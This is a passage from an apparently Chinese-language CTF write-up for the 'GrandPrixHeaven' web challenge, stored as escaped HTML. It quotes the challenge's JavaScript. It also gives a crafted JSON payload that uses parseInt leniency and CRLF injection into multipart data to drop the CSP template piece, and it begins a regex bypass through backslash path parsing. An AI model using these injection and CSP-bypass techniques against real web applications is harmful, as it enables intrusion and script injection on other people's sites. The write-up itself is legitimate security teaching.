style=\"display:flex;\"\u003e\u003cspan\u003e    });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003econfig_id\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esaved_config\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epublic_id\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eredirect\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`/fave/\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003econfig_id\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e?F1=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003econfig_id\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`ERROR IN /api/new-car:\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e400\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;An error occurred\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我們只要在 post body 裡面多塞個 custom 裡面放 template pieces 的 json 就可以了。\u003c/p\u003e\n\u003cp\u003e再回到 \u003ccode\u003e/fave/:GrandPrixHeaven\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e這邊的定義 template pieces 還是有一些限制\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_PIECES\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eincludes\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etoLowerCase\u003c/span\u003e()) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eisNum\u003c/span\u003e(parseInt(\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e)) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;object\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e就是我們的 template piece 必須要包含再 \u003ccode\u003eTEMPLATE_PIECES\u003c/code\u003e 內且 index 必須要是數字，以及 template piece 的內容的 type 不能是 \u003ccode\u003eobject\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_PIECES\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;head_end\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;upload_form\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;footer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;retrieve\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apiparser\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#75715e\"\u003e/* We\u0026#39;ve deprecated the mediaparser. apiparser only! */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;faves\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這邊數字的地方很有趣是他是先過 \u003ccode\u003eparseInt\u003c/code\u003e 再 \u003ccode\u003eisNum\u003c/code\u003e 而 js 的 \u003ccode\u003eparseInt\u003c/code\u003e 有一個特性是\u003cstrong\u003e只要 string 的開頭是數字都能被 parse 成數字\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a6dc3e10-0f76-4574-b7a2-8f8c23189fbb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e所以我們可以利用這點在 index 裡面放任意的東西，這可以影響到傳遞的 template pieces 的排序，因為做 JSON.parse 時會對 key 做一次排序。\u003c/p\u003e\n\u003cp\u003e除此之外還會影響一個問題，就是可以做到 CRLF injection，且由於 boundary 是寫死的，這樣可以做到 inject multipart/form-data 來達成添加 template piece 的目標。\u003c/p\u003e\n\u003cp\u003eCSP 的部分由於他會強制檢查一定要有 csp 這個 template pieces 且 index 一定要是 0，但這邊的數字一樣是會過 parseInt 所以可以用上面講的方式去影響排序，讓 CSP 放到最後面，放到最後會有甚麼影響，這邊可以看到 template server 的 \u003ccode\u003eindex.js\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparseMultipartData\u003c/span\u003e  \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eboundary\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esplit\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eboundary\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// always start with the \u0026lt;head\u0026gt; element\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprocessedTemplate\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etemplates\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehead_start\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// to prevent loading an html page of arbitrarily large size, limit to just 7 at a time\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elength\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elength\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// seperate body from the header parts\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003esplit\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\r\\n\\r\\n\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    .\u003cspan style=\"color:#a6e22e\"\u003emap\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e) =\u0026gt; \u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ereplaceAll\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\r\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    .\u003cspan style=\"color:#a6e22e\"\u003efilter\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e) =\u0026gt; { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eof\u003c/span\u003e Object.\u003cspan style=\"color:#a6e22e\"\u003ekeys\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003etemplates\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eincludes\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eprocessedTemplate\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etemplates\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eitem\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprocessedTemplate\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他最多只拿最上面的 6 個 template pieces\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elength\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echunks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elength\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e所以只要上面放 7 個 template pieces 並把 csp 移到最下面，取得的 html 就不會有 CSP\u003c/p\u003e\n\u003cp\u003e我們就可以構造出以下的 json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;retrieve\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;2\\\u0026#34;\\r\\n\\r\\nmediaparser\\r\\n--GP_HEAVEN\\r\\nContent-Disposition: form-data; name=\\\u0026#34;3\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;head_end\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;faves\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;5\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;footer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;6\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;footer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;0a\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然後 post 上去新增\u003c/p\u003e\n\u003cp\u003e(ps: 這是還沒處理 csp 的)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b26b0c6-1e00-4d62-ae2e-5f60879241d4\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e以後來看一下頁面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a70d0d7e-1e55-4b03-b651-ab199381bbb5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到成功拿到 mediaparser，但由於我們 \u003ccode\u003eF1\u003c/code\u003e param 裡的 path 也就是 \u003ccode\u003ehttps://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/\u0026lt;F1\u0026gt;\u003c/code\u003e 是 json 所以要想辦法讓 \u003ccode\u003eF1\u003c/code\u003e 跳到圖片的路徑，比如說 \u003ccode\u003e../../media/\u0026lt;img-id\u0026gt;\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e但是 \u003ccode\u003eretrieve.js\u003c/code\u003e 有路徑檢查\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no path\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e RegExp(\u003cspan style=\"color:#e6db74\"\u003e/^[A-z0-9\\s_-]+$/i\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#75715e\"\u003e// normalize\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e              \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ereplaceAll\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e/\\s/g\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;regex fail\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6cc23108-5d12-4abc-9ddb-a1f44a9362be\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e所以這邊要想辦法繞 RegExp。\u003c/p\u003e\n\u003cp\u003e裡面有一個部分很有趣，那就是 \u003ccode\u003eA-z\u003c/code\u003e 這邊應該要是 \u003ccode\u003eA-Za-z\u003c/code\u003e，這樣寫或造成的影響是，因為他是依照 ascii 的順序，因此放在 Z 到 a 中間的字元是可以用的，也就是 \u003ccode\u003eZ[\\]^_`a\u003c/code\u003e 其中的 \u003ccode\u003e\\\u003c/code\u003e，因為 \u003ccode\u003eretrieve.js\u003c/code\u003e 做 request 時會用 \u003ccode\u003enew URL\u003c/code\u003e 做 url parse，而 \u003ccode\u003e\\\u003c/code\u003e 會被他解成 \u003ccode\u003e/\u003c/code\u003e，並且如果 path 是絕對路徑時，他會把 base url 裡變得 path 蓋掉，所以如果我放 \u003ccode\u003e\\media\\\u0026lt;img-id\u0026gt;\u003c/code\u003e 會被他解析成 